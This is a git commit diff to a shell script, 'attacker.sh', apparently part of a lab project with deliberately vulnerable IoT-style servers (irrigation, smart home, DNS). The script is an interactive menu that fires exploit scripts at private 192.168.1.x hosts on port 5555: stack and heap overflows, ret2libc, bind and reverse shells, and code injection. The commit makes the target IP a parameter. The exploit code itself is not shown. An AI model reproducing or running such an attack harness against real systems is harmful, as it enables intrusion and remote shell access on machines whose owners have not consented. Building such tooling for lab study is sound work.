f2e1d61316003c14cdfcc0065474129b959ce933
salahuddin975 <salahuddin975@gmail.com>
2020-07-06 16:54:33 +0100

    Distribut servers.

--- attacker.sh
+++ attacker.sh
@@ -14,31 +14,34 @@ Attack()
 		echo "	Code injection attack --> 8"
 		echo "	Select new server --> 9"
 
+
+		echo $2
+
        		read input
         	case $input in
                 	1) 
-                        	$1/so.py "192.168.1.4" 5555
+                        	$1/so.py $2 5555
                        		;;
                		2) 
-                       		$1/ret_2_libc.py "192.168.1.4" 5555
+                       		$1/ret_2_libc.py $2 5555
                        		;;
                		3) 
-                       		$1/ho.py "192.168.1.4" 5555
+                       		$1/ho.py $2 5555
                       		;;
 			4)
-				$1/so_bind.py "192.168.1.4" 5555
+				$1/so_bind.py $2 5555
 				;;
 			5)
-				$1/ho_bind.py "192.168.1.4" 5555
+				$1/ho_bind.py $2 5555
 				;;
 			6)
-				$1/so_rev.py "192.168.1.4" 5555
+				$1/so_rev.py $2 5555
 				;;
 			7)
-				$1/rev_ret2libc.py "192.168.1.4" 5555
+				$1/rev_ret2libc.py $2 5555
 				;;
 			8)
-				$1/injecting_code.py "192.168.1.4" 5555
+				$1/injecting_code.py $2 5555
 				;;
 			9)
 				return
@@ -61,32 +64,33 @@ Attack()
 
 
 
+IRRIGATION_SERVER = "192.168.1.26"
+SMARTHOME_SERVER = "192.168.1.27"
+DNS_SERVER = "192.168.1.28"
+
+
 while true
 do
 	echo "Please, choose a particular Server to EXPLOIT..."
         echo "	Irrigation Server --> 1"
         echo "	Smart Home --> 2"
-	echo "	Remote Control Car Monitor --> 3"
-	echo "	DNS server --> 4"
-	echo "	exit from program -> 5"
+	echo "	DNS server --> 3"
+	echo "	exit from program -> 4"
 
 	read program
 	case $program in
 		1)
-			Attack ./IrrigationServer 
+			Attack ./IrrigationServer "192.168.1.26"
 			;;
 
 		2)
-                	Attack ./smarthome
+                	Attack ./smarthome "192.168.1.27"
                 	;;
-		
+           
 		3)
-                	Attack ./remote-control-monitor-car-server/src
-                	;;
-		4)
-			Attack ./DNS_server_raspberrypi
+			Attack ./DNS_server_raspberrypi "192.168.1.28"
 			;;
-		5)
+		4)
 			exit 1
 			;;
 
